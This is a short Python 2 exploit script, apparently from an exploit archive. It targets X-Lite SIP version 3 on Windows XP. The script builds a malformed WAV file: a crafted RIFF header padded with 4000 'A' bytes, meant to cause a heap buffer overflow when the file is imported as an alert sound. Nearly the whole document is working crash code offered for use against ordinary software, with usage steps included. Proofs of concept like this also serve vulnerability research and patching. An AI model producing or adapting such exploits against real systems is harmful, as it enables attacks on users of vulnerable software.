#!/usr/bin/python
#
# ####################################################################
#
# X-lite SIP v3 (wav) memory corruption Heap BOF exploit
# Date: 06-02-2010
# Author: TecR0c
# Software Link: http://xlite.counterpath.com/download/win32_100106
# Version: 3.0
# Tested on:  Windows XP SP3
# Usage: right click running application > options > Alerts & sounds > import --> boom!
#
######################################################################
 
header = ("\x52\x49\x46\x46\xe4\x0a\x09\x00\x57\x41\x56\x45\x66\x6d\x74\x20"
"\x10\x00\x00\x00\x01\x00\x02\x00\x44\xac\x00\x00\x10\xb1\x02\x00"
"\x04\x00\x10\x00\x64\x61\x74\x61\xc0\x0a\x09\x00\x01\x00\x01\x00"
"\x00\x00\x01\x00\x01\x00\x04\x00\x00\x00\x05\x00\x02\x00\x08\x00"
"\x02\x00\x09\x00\x01\x00\x0a")
 
exploit = header
exploit += "\x41" * 4000
 
try:
    print "[+] Creating exploit file.."
    crash = open('TecR0c-wins.wav','w');
    crash.write(exploit);
    crash.close();
except:
    print "[-] Error: You do not have correct permissions.."